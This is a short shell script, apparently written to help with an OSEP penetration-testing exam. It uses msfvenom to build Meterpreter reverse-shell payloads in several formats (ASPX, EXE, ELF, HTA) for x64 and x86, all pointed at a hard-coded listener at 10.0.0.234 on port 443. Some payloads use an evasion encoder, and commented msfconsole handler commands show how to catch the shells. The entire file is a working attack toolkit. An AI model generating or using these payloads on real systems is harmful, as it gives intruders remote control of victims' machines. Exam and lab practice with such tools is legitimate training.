#!/bin/sh

# Quicky generate msfvenom bin for OSEP exam
# author: 午後の紅茶
# version: v1.0

static_local_ip_address=10.0.0.234
static_local_port=443

savePath=./temp_bin/

mkdir temp_bin

echo "IP: " $static_local_ip_address
echo "Port: "$static_local_port
echo $savePath

# generate bin

mkdir $savePath/x64
mkdir $savePath/x86

## x64
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$static_local_ip_address LPORT=$static_local_port -e x64/zutto_dekiru -f aspx > $savePath/x64/reverse_tcp.aspx
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$static_local_ip_address LPORT=$static_local_port prependfork=true -f elf > $savePath/x64/reverse_tcp.elf
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$static_local_ip_address LPORT=$static_local_port -f exe -e x64/zutto_dekiru > $savePath/x64/reverse_https.exe

# sudo msfconsole -x 'use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set lhost 0.0.0.0;set lport 443;run'

## x86
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$static_local_ip_address LPORT=$static_local_port -e x64/zutto_dekiru -f aspx > $savePath/x86/reverse_tcp.aspx
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$static_local_ip_address LPORT=$static_local_port prependfork=true -f elf > $savePath/x86/reverse_tcp.elf
msfvenom -p windows/meterpreter/reverse_https LHOST=$static_local_ip_address LPORT=$static_local_port -f exe > $savePath/x86/reverse_https.exe

# sudo msfconsole -x 'use exploit/multi/handler;set payload windows/meterpreter/reverse_https;set lhost 0.0.0.0;set lport 443;run'

# generate html doc hta js
msfvenom -p windows/meterpreter/reverse_https LHOST=$static_local_ip_address LPORT=$static_local_port -f hta-psh >  $savePath/shell.hta